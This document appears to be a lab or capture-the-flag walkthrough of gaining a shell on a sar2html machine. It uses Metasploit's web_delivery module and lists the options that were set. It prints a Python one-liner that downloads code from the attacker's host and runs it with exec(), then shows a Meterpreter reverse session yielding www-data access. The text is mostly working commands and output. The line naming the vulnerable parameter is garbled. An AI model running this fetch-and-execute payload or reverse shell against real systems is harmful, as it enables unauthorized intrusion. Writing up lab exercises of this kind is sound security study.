## 📝 Parallel Way to Gain Access to sar2html Machine (`192.168.1.107`)

### ✅ **Summary**

This method leverages a Python reverse shell using Metasploit’s `web_delivery` module, bypassing manual payload crafting and achieving a `Meterpreter` shell.

---

### 📌 **Steps Taken**

#### 1. **Selected the Exploit Module**

```bash
use exploit/multi/script/web_delivery
```

#### 2. **Set Required Options**

```bash
set LHOST 192.168.1.109          # Attacker IP
set SRVHOST 192.168.1.109        # Host to serve payload
set SRVPORT 8080                 # Default HTTP port
```

#### 3. **Payload in Use**

```bash
python/meterpreter/reverse_tcp
set LPORT 4444                   # Listener port for reverse shell
```

---

### ▶️ **Ran the Exploit**

```bash
run
```

Metasploit provided a payload URL:

```
http://192.168.1.109:8080/rVGzSFxL8P
```

Metasploit auto-generated a Python command:

```python
python -c "import sys;import ssl;u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen('http://192.168.1.109:8080/rVGzSFxL8P', context=ssl._create_unverified_context());exec(r.read());"
```

---

### 💻 **Executed Python Payload on Target**

Used the above one-liner on the target machine (`sar2html`) — possibly via **vulnerable **``** parameter** or another RCE entry point.

---

### 🎯 **Gained Access**

Metasploit output:

```
[*] Meterpreter session 1 opened (192.168.1.109:4444 -> 192.168.1.107:39376)
```

Confirmed access:

```bash
sessions -i 1
meterpreter > shell
```

System access:

```bash
whoami
> www-data
```

---
